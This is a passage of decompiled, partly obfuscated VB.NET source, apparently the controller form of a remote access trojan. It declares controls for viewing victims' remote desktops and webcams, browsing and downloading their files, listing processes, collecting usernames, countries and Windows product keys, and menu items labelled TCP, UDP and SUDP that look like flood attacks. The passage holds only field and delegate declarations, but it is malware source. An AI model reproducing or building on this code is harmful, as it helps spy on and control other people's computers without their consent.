        <AccessedThroughProperty("StopToolStripMenuItem4")> _
        Private _StopToolStripMenuItem4 As ToolStripMenuItem
        <AccessedThroughProperty("StopToolStripMenuItem5")> _
        Private _StopToolStripMenuItem5 As ToolStripMenuItem
        <AccessedThroughProperty("StopToolStripMenuItem6")> _
        Private _StopToolStripMenuItem6 As ToolStripMenuItem
        <AccessedThroughProperty("SUDPToolStripMenuItem")> _
        Private _SUDPToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("SwapMouseButtonToolStripMenuItem")> _
        Private _SwapMouseButtonToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("TabPage1")> _
        Private _TabPage1 As TabPage
        <AccessedThroughProperty("TabPage2")> _
        Private _TabPage2 As TabPage
        <AccessedThroughProperty("TabPage3")> _
        Private _TabPage3 As TabPage
        <AccessedThroughProperty("TabPage4")> _
        Private _TabPage4 As TabPage
        <AccessedThroughProperty("TabPage5")> _
        Private _TabPage5 As TabPage
        <AccessedThroughProperty("TCPToolStripMenuItem")> _
        Private _TCPToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("TextBox1")> _
        Private _TextBox1 As TextBox
        <AccessedThroughProperty("TextBox2")> _
        Private _TextBox2 As TextBox
        <AccessedThroughProperty("textsteam")> _
        Private _textsteam As TextBox
        <AccessedThroughProperty("ToolStripMenuItem1")> _
        Private _ToolStripMenuItem1 As ToolStripSeparator
        <AccessedThroughProperty("ToolStripMenuItem2")> _
        Private _ToolStripMenuItem2 As ToolStripMenuItem
        <AccessedThroughProperty("ToolStripSeparator1")> _
        Private _ToolStripSeparator1 As ToolStripSeparator
        <AccessedThroughProperty("ToolStripSeparator10")> _
        Private _ToolStripSeparator10 As ToolStripSeparator
        <AccessedThroughProperty("ToolStripSeparator11")> _
        Private _ToolStripSeparator11 As ToolStripSeparator
        <AccessedThroughProperty("ToolStripSeparator12")> _
        Private _ToolStripSeparator12 As ToolStripSeparator
        <AccessedThroughProperty("ToolStripSeparator13")> _
        Private _ToolStripSeparator13 As ToolStripSeparator
        <AccessedThroughProperty("ToolStripSeparator2")> _
        Private _ToolStripSeparator2 As ToolStripSeparator
        <AccessedThroughProperty("ToolStripSeparator4")> _
        Private _ToolStripSeparator4 As ToolStripSeparator
        <AccessedThroughProperty("ToolStripSeparator5")> _
        Private _ToolStripSeparator5 As ToolStripSeparator
        <AccessedThroughProperty("ToolStripSeparator6")> _
        Private _ToolStripSeparator6 As ToolStripSeparator
        <AccessedThroughProperty("ToolStripSeparator7")> _
        Private _ToolStripSeparator7 As ToolStripSeparator
        <AccessedThroughProperty("ToolStripSeparator8")> _
        Private _ToolStripSeparator8 As ToolStripSeparator
        <AccessedThroughProperty("ToolStripSeparator9")> _
        Private _ToolStripSeparator9 As ToolStripSeparator
        <AccessedThroughProperty("ToolStripSplitButton1")> _
        Private _ToolStripSplitButton1 As ToolStripSplitButton
        <AccessedThroughProperty("ToolStripStatusLabel1")> _
        Private _ToolStripStatusLabel1 As ToolStripStatusLabel
        <AccessedThroughProperty("ToolStripStatusLabel2")> _
        Private _ToolStripStatusLabel2 As ToolStripStatusLabel
        <AccessedThroughProperty("ToolStripTextBox1")> _
        Private _ToolStripTextBox1 As ToolStripTextBox
        <AccessedThroughProperty("ToolStripTextBox10")> _
        Private _ToolStripTextBox10 As ToolStripTextBox
        <AccessedThroughProperty("ToolStripTextBox11")> _
        Private _ToolStripTextBox11 As ToolStripTextBox
        <AccessedThroughProperty("ToolStripTextBox12")> _
        Private _ToolStripTextBox12 As ToolStripTextBox
        <AccessedThroughProperty("ToolStripTextBox13")> _
        Private _ToolStripTextBox13 As ToolStripTextBox
        <AccessedThroughProperty("ToolStripTextBox14")> _
        Private _ToolStripTextBox14 As ToolStripTextBox
        <AccessedThroughProperty("ToolStripTextBox2")> _
        Private _ToolStripTextBox2 As ToolStripTextBox
        <AccessedThroughProperty("ToolStripTextBox3")> _
        Private _ToolStripTextBox3 As ToolStripTextBox
        <AccessedThroughProperty("ToolStripTextBox4")> _
        Private _ToolStripTextBox4 As ToolStripTextBox
        <AccessedThroughProperty("ToolStripTextBox5")> _
        Private _ToolStripTextBox5 As ToolStripTextBox
        <AccessedThroughProperty("ToolStripTextBox6")> _
        Private _ToolStripTextBox6 As ToolStripTextBox
        <AccessedThroughProperty("ToolStripTextBox7")> _
        Private _ToolStripTextBox7 As ToolStripTextBox
        <AccessedThroughProperty("ToolStripTextBox8")> _
        Private _ToolStripTextBox8 As ToolStripTextBox
        <AccessedThroughProperty("ToolStripTextBox9")> _
        Private _ToolStripTextBox9 As ToolStripTextBox
        <AccessedThroughProperty("TracerouteIPToolStripMenuItem")> _
        Private _TracerouteIPToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("txtListening")> _
        Private _txtListening As ToolStripStatusLabel
        <AccessedThroughProperty("UDPToolStripMenuItem")> _
        Private _UDPToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("UnfreezeToolStripMenuItem")> _
        Private _UnfreezeToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("UsbToolStripMenuItem")> _
        Private _UsbToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("UsernameToolStripMenuItem")> _
        Private _UsernameToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("VersionToolStripMenuItem")> _
        Private _VersionToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("ViewRemoteDesktopToolStripMenuItem")> _
        Private _ViewRemoteDesktopToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("VisitWebsiteToolStripMenuItem")> _
        Private _VisitWebsiteToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("WebcamToolStripMenuItem")> _
        Private _WebcamToolStripMenuItem As ToolStripMenuItem
        <AccessedThroughProperty("Win8Progressbar1")> _
        Private _Win8Progressbar1 As Win8Progressbar
        <AccessedThroughProperty("WindowsKeyToolStripMenuItem")> _
        Private _WindowsKeyToolStripMenuItem As ToolStripMenuItem
        Public actualcountry As String
        Public actualip As String
        Public actualusername As String
        Public autorefreshact As Integer
        Public autorefreshInt As Integer
        Public autosize As Integer
        <AccessedThroughProperty("ToolStripSeparator3")> _
        Private CbrcOhuJaN As ToolStripSeparator
        <AccessedThroughProperty("ColumnHeader7")> _
        Private columnHeader_0 As ColumnHeader
        <AccessedThroughProperty("ColumnHeader8")> _
        Private columnHeader_1 As ColumnHeader
        <AccessedThroughProperty("lstping")> _
        Private columnHeader_10 As ColumnHeader
        <AccessedThroughProperty("lstipaddress")> _
        Private columnHeader_2 As ColumnHeader
        <AccessedThroughProperty("lstversion")> _
        Private columnHeader_3 As ColumnHeader
        <AccessedThroughProperty("lststatus")> _
        Private columnHeader_4 As ColumnHeader
        <AccessedThroughProperty("lstcpname")> _
        Private columnHeader_5 As ColumnHeader
        <AccessedThroughProperty("lstusername")> _
        Private columnHeader_6 As ColumnHeader
        <AccessedThroughProperty("lstwinprckey")> _
        Private columnHeader_7 As ColumnHeader
        <AccessedThroughProperty("lstopsys")> _
        Private columnHeader_8 As ColumnHeader
        <AccessedThroughProperty("lstcountry")> _
        Private columnHeader_9 As ColumnHeader
        Public enable As Boolean
        Private icontainer_0 As IContainer
        <AccessedThroughProperty("ImageList1")> _
        Private imageList_0 As ImageList
        Public inisettings As iniSettings
        Private int_0 As Integer
        Private int_1 As Integer
        Public listening As Boolean
        Private Const long_0 As Long = &H101E
        Private Const long_1 As Long = -2
        Private mutex_0 As Mutex
        <AccessedThroughProperty("NotifyIcon1")> _
        Private notifyIcon_0 As NotifyIcon
        Public password As String
        Public popupnotify As Integer
        Public popupvisuel As Integer
        Public port As Integer
        Private tcpListener_0 As TcpListener
        <AccessedThroughProperty("RichTextBox1")> _
        Private textBox_0 As TextBox
        Private thread_0 As Thread
        <AccessedThroughProperty("Timer1")> _
        Private timer_0 As Timer
        <AccessedThroughProperty("txtOnline")> _
        Private YmuEnWtCyp As ToolStripStatusLabel

        ' Nested Types
        Public Delegate Sub AddDelegate(ByVal client As Connection, ByVal strings As String())

        Public Delegate Sub DelDisplayMessage(ByVal msg As String)

        Public Delegate Sub DelDrives(ByVal drives As String)

        Public Delegate Sub DelegateGetSysInfo(ByVal os As String, ByVal cpu As String, ByVal cores As String, ByVal videocard As String, ByVal windir As String, ByVal ram As String, ByVal isAdmin As String)

        Public Delegate Sub DelegateRemoteDesk(ByVal deskimage As Image, ByVal bytecount As Integer)

        Public Delegate Sub DelSaveDownloadedFile(ByVal client As Connection, ByVal content As Byte(), ByVal name As String)

        Public Delegate Sub DelToggleListen()

        Public Delegate Sub DirDelegate(ByVal dirs As String, ByVal files As String, ByVal path As String)

        Public Delegate Sub DisconnectedDelegate(ByVal client As Connection)

        Public Delegate Sub PrcListDelegate(ByVal prcs As String)

        Public Delegate Sub RefreshDelegate()

        Public Delegate Sub UpdateStatusDelegate(ByVal client As Connection, ByVal Message As String)

        Public Delegate Sub UpdateStatusFilemanagerDelegate(ByVal Message As String)
    End Class
End Namespace

